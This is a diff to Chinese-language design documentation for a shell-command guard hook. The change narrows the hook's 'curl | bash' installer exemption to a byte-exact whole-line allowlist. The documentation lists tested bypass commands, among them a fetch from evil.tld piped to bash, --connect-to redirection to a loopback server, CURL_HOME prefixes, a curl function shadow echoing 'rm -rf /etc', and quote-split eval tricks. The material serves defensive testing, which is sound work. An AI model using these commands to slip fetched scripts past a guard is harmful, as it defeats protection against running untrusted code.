@@ -619,8 +619,10 @@ substitution 進來的，這道閘門必須先讀得到那段腳本，否則**�
 
 ### 允許的 piped installer 清單 / Allowed piped installers
 
-`hooks/protect-important-paths.js` 裡的 `PIPED_SCRIPT_EXCEPTIONS` 是上一條規則唯一的豁免
-清單。今天它只有一項：
+上一條規則唯一的豁免，是 `hooks/protect-important-paths.js` 裡的
+`CANONICAL_INSTALL_LINES`：**一份「整條命令列」的清單**。命令列必須就是清單上的其中一行，
+才會被豁免。另有一份 `PIPED_SCRIPT_EXCEPTIONS` 是網址前綴的第二道關卡（縱深防禦），今天
+它只有一項：
 
 ```
 https://raw.githubusercontent.com/sieg-wang/better-rm/
@@ -639,8 +641,10 @@ curl -sSL https://raw.githubusercontent.com/sieg-wang/better-rm/main/install-hoo
 寫出這個前綴，而這道閘門無法驗證伺服器回什麼。它的職責只是不要讓上一條規則擋掉本專案自己
 記載的安裝方式，不是建立信任。把它讀成授權機制、然後放寬它，就會把它變成一張通行證。
 
-**怎麼擴充**（這是使用者的決定，不是解析器的）：在 `PIPED_SCRIPT_EXCEPTIONS` 陣列裡加一個
-字串，形狀必須是 `scheme + host + owner/repo` 而且**以 `/` 結尾**。
+**怎麼擴充**（這是使用者的決定，不是解析器的）：新增一條安裝路徑要改**兩個地方**——把
+**整條命令列**加進 `hooks/protect-important-paths.js` 的 `CANONICAL_INSTALL_LINES`，並確認
+它的網址前綴在 `PIPED_SCRIPT_EXCEPTIONS` 上（形狀是 `scheme + host + owner/repo` 而且
+**以 `/` 結尾**）。同一條路徑也必須寫進上面那個區塊，否則測試會紅（見本節最後一段）。
 
 - 不要加裸 host（`https://raw.githubusercontent.com/` 會豁免那台主機上的每一個 repo）。
 - 不要省略 scheme（沒有 scheme 的前綴會命中更長的主機名，例如
@@ -648,68 +652,48 @@ curl -sSL https://raw.githubusercontent.com/sieg-wang/better-rm/main/install-hoo
 - 不要用 `http://`，不要用萬用字元——比對就是 `startsWith`，維持這麼簡單。
 - 結尾的 `/` 是有作用的：少了它，`better-rm-evil` 也會命中。
 
-比對還有五個收窄條件，每一個都是實測出來的：
+**豁免只有一個條件：整條命令列必須就是上面那四行的其中一行。** 比對之前只做兩件事：去掉
+前後的 ASCII 空白（尾端的換行算在內），以及把連續的空白／tab 併成一個空格；除此之外必須
+逐位元組相同。行上不可以有別的東西：
 
-1. 產生器必須是 `curl` 或 `wget`，而且**只有一個非選項操作元**（那個網址）。
-   `curl -sSL https://evil.tld/y.sh <豁免網址> | bash` 因此被擋。
-2. 網址裡不得出現 `..`、`%2e`、`%2f`、`%5c`：HTTP client 會在送出前正規化 `..`，
-   純文字前綴比對否則會被 `…/better-rm/../../evil/x.sh` 繞過。
-3. **選項採白名單**：只接受不會移動這次抓取的那幾個（curl：`-s`／`-S`／`-L`／`-f`
-   與其合寫、`--silent`／`--show-error`／`--location`／`--fail`／`--ipv4`／`--ipv6`／
-   `--compressed`／`--no-progress-meter`；wget：`-q`／`-nv`／`-4`／`-6`／`-O-`／`-qO-`
-   等）。實測 2026-09-03：`curl -k --connect-to raw.githubusercontent.com:443:127.0.0.1:18443
-   -sSL <逐位元組符合前綴的網址>` 會從 loopback 的 TLS 伺服器取回攻擊者控制的內容，
-   `--resolve`、`--proxy`、`--unix-socket`、`-K`、`-o` 同理。白名單之外的選項一律讓產生器
-   回到「讀不到」，也就是拒絕。
-4. **產生器那個字前面必須什麼都沒有，而且必須是赤裸的 `curl`／`wget`**：不得有環境變數指派
-   （`https_proxy=`、`CURL_HOME=`、`WGETRC=`、`CURL_CA_BUNDLE=`、`LD_PRELOAD=`、`PATH=`），
-   不得有透明外殼（`env`／`sudo`／`command`／`exec`／`nice`／`nohup`／`setsid`／`time`／
-   `builtin`／`noglob`／`!`，以及它們的任意串接），也不得帶路徑（`/usr/bin/curl`、`./curl`、
-   `/tmp/evil/curl`）。理由與第 3 點是同一個，而且更直接：`CURL_HOME` 指的就是 `-K` 指的那份
-   設定檔、`WGETRC` 就是 `--config`，而第 3 點早就把那兩個選項擋掉了——實測 2026-09-04，
-   `curl -K /tmp/evil/.curlrc <豁免網址> | bash` 被拒，`CURL_HOME=/tmp/evil curl <同一個網址>
-   | bash` 卻放行。產生器的標籤取自 `path.basename()`，所以少了「必須赤裸」這一半，任何一個
-   叫做 `curl` 的執行檔都會繼承豁免。**shell 的控制字不算前綴**（`if`／`then`／`do`／`{`）：
-   那是語法、搬不動抓取，把它算進去只會讓 `if true; then curl <豁免網址> | bash; fi` 被誤擋；
-   `\curl`、`"curl"`、`'curl'` 也照舊豁免，因為斷詞後是同一個字、bash 解析到的是同一個執行檔。
-5. **命令列的原始文字不得含有「能把別的東西塞到產生器那個名字後面」的寫法**。第 4 點問的是
-   「命令字前面站了什麼」，而函式定義站的不是前面——它是同一行上的**另一條命令**，所以
-   `prefixed` 看不到它。實測 2026-09-04：
-   `curl() { echo "rm -rf /etc"; }; curl -sSL <豁免網址> | bash` **放行**，而且 touch payload 真的
-   執行、沒有任何請求離開這台機器——網址文字逐位元組相符，跑的卻不是 curl。
-   作廢豁免的**確切規則**是（掃的是**原始文字**，不是斷詞後的字串流）：
-   - **(a) 產生器自己的名字被定義**：`curl() { … }`、`curl () { … }`、`curl(){ … }`、
-     `function curl { … }`、`alias curl=…`（wget 同理），或行上出現 `hash -p`
-     （它把一個名字指向指定的檔案）。
-   - **(b) 行上出現 `eval`、`source`、點命令（`. `）、`trap`、`exec` 任何一個**——每一個都能在
-     那個名字執行之前把別的命令換上去，而它們攜帶的定義文字這道閘門讀不到。
+- **前面不行**——`cd /tmp && …`、`if true; then …; fi`、`set -e; …`、`FOO=1 …`、`sudo …`、
+  `env …`，以及任何寫在它前面的另一條命令（`echo sourced; …`、`ls ./install.sh; …`）。
+- **後面不行**——`…; echo done`、`… && …`、`… | tee x`、`… # 註解`。
+- **中間不可以有換行**：`curl … |`（換行）`bash` 不是這一行。
+- **引號與跳脫寫法不算同一行**：`\curl …`、`"curl" …`、`'curl' …` 都會被拒絕，即使 bash
+  解析到的是同一個執行檔。
+- **同一條路徑的其他寫法也不算**：選項換順序（`-sSfL` 之於 `-sSL`）、多一個選項
+  （`… | bash -O extglob`）、多一個重導向（`… 2>/dev/null | bash`、`… | bash < /dev/stdin`）、
+  主機名大小寫不同，全都不是這一行。
+- **豁免只看使用者打的那一行**：`bash -c '<豁免路徑>'`、`echo '<豁免路徑>' | bash`、
+  `BASH_ENV=… bash -c '<豁免路徑>'` 這種「要靠這道閘門自己重建出來才變成記載路徑」的寫法，
+  一律拒絕。
 
-   **為什麼掃原始文字**：斷詞後的字串流只看得到「被斷成獨立字」的定義。把同一個定義塞進一個字
-   裡面它就消失了，例如 `eval 'curl(){ … }'`、`source <(echo 'curl(){ … }')`、`. <(…)`、
-   `source /dev/stdin <<< '…'`、here-doc、`eval "$(…)"`、`` eval `…` ``。2026-09-05 實測（用不
-   存在的替身名字，marker 只有在定義生效時才會出現）：上面每一種寫法在 bash 5.3.15 與
-   /bin/bash 3.2.57 都真的把名字定義掉了，而在 2026-09-04 的版本它們全部**放行**。
-   **(b) 不判斷命令位置，也判斷不了**（這裡是文字不是字串流，這正是它存在的理由），所以它有
-   兩種**已接受的誤擋**：`source ~/.profile; curl -fsSL <豁免網址> | bash` 會被擋（`source` 讀
-   的是使用者自己的檔案），`echo eval; curl <豁免網址> | bash` 也會被擋（那裡的 `eval` 是
-   `echo` 的操作元，不是命令字）。**繞法是把那一行拆成兩行**。點命令只在「命令字站得住的位置
-   而且後面接空白」時才算，所以 `ls ./install.sh; curl <豁免網址> | bash` 照舊放行。
-   **「行上任何位置」是刻意的 fail-closed**：寫在管線「後面」的定義其實遮蔽不了它（bash 先剖析整
-   行，但函式要到執行到那條命令才被定義），所以 `curl <豁免網址> | bash; curl() { :; }` 是誤擋。
-   選這個方向的理由是：照位置排序等於在安全邊界上多一套位置簿記，而 `&`、換行與續行符各自都能讓
-   它出錯，換到的只是一條沒人會寫的命令的放行。alias 同理（非互動 shell 不展開、同一行也不生效，
-   但閘門看不出手上這一行是不是在互動提示下打的）。**(a) 判斷的是產生器自己的名字**：
-   `wget() { … }; curl <豁免網址> | bash`、`curlx() { … }; …`、`my_curl() { … }; …` 都照舊放行。
+上面每一種都是**已接受的代價**，不是缺陷：它們在 2026-09-04 以前是放行的，現在會落回
+「讀不到的 piped script」拒絕。**繞法是把那條路徑單獨寫成一行。**
 
-上面每一條（四條放行、以及 owner 換掉、port 寫法、host 後綴、repo 前綴、`..`、`%2e`、
-第二個網址、`--connect-to`／`--resolve`／`--proxy`／`--unix-socket`／`-K`／`-o` 等擋掉的
-寫法）都在 `test-hooks.js` 的 `installRouteAllowances` 與 `exceptionListControls` 裡，
-走真正的 stdin 契約跑過；放寬清單而不改測試，測試會紅。第 5 點的負面列（函式／alias 遮蔽、
-`eval`／`source`／`.`／here-doc／`trap`／`hash -p` 的每一種寫法，以及兩條已接受的誤擋）
-也在 `exceptionListControls` 裡，它的正面對照（定義別的名字、定義以它為前綴的名字、
-`curl (the tool)` 這種括號不相鄰的文字、`sourced`、`./install.sh`）在 `allowed` 裡——少了
-那些列，規則可以被放寬成「這一行有任何函式定義就拒絕安裝路徑」、或收窄成只認斷詞看得到的
-定義，而不會轉紅。
+**為什麼是整行，而不是一組收窄條件。** 2026-09-03 起的三輪做的都是同一件事：列舉「一行上
+有多少種方法能把別的東西塞到 `curl` 後面」——重新定義同名函式、`alias`、`hash -p`、`eval`、
+`source`、點命令、`trap`、`exec`、把定義塞進一個字裡、把關鍵字拆開寫。每一輪都補上了前一輪
+被打穿的寫法，然後被下一種沒被列舉到的寫法打穿。最後一次是**字裡面的引號消去**：
+`e''val 'c''url() { … }'; <豁免網址> | bash` 的原始位元組裡既沒有 `eval` 也沒有 `curl(`，
+而斷詞之後那個定義是**一個字**——兩種掃法都看不到它，shell 的引號消去卻會把兩者都還原
+（2026-09-05 走真正的 stdin 入口實測：函式真的被定義、替身真的被執行，bash 5.3.15 與
+/bin/bash 3.2.57 皆然）。整行字面比對關掉的是**整個類別**，理由不是「這次列舉得比較完整」：
+攻擊者多打的任何一個字元，都是讓這一行不再是這一行的字元。
+
+那些列舉出來的收窄條件**沒有被刪掉**（產生器必須是赤裸的 `curl`／`wget`、只有一個非選項
+操作元、網址不得含 `..`／`%2e`／`%2f`／`%5c`、選項採白名單、同一行不得重新定義產生器的名字）。
+它們留在程式碼與測試裡當縱深防禦，只是在整行規則之下**已經到不了**：逐位元組等於記載路徑的
+一行，本來就不可能同時帶著前綴、第二個操作元、白名單外的選項或一個函式定義。
+
+上面每一條（四條放行與它們的空白寫法、以及 owner 換掉、port 寫法、host 後綴、repo 前綴、
+`..`、`%2e`、第二個網址、`--connect-to`／`--resolve`／`--proxy`／`--unix-socket`／`-K`／
+`-o`，加上本節列出的每一種前綴、後綴、重導向、選項順序、引號寫法與重建寫法）都在
+`test-hooks.js` 的 `installRouteAllowances`、`exceptionListControls`、`wholeLineRuleCosts`、
+`inWordQuoteRemovalBlocked`、`offLineProducerBlocked` 裡，走真正的 stdin 契約跑過；放寬規則
+而不改測試，測試會紅。`CANONICAL_INSTALL_LINES` 與上面那個程式碼區塊還會被**逐行、照順序、
+逐位元組**比對：只改其中一邊，測試一樣會紅。
 
 ### `find` 什麼時候被當成刪除工具
 
